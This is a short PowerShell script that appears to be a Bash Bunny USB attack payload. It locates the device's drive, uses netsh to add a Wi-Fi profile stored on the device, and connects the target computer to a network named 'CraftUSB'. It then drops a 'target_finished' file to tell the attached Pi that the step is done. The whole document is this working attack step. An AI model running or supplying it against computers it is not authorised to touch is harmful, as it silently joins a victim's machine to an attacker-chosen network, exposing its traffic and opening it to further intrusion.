# Find the driveletter of the bunny
$hoc = (gwmi win32_volume -f "label='BUNNY'").Name + 'payloads\wifi\CraftUSB.xml'
$drive = (gwmi win32_volume -f "label='BUNNY'").Name
netsh wlan add profile filename=$hoc

netsh wlan connect ssid=CraftUSB name=CraftUSB



# Tell pi that we are finished by creating a file called target_finished in the root of the bunny storage 

New-Item ($drive + "target_finished") -type file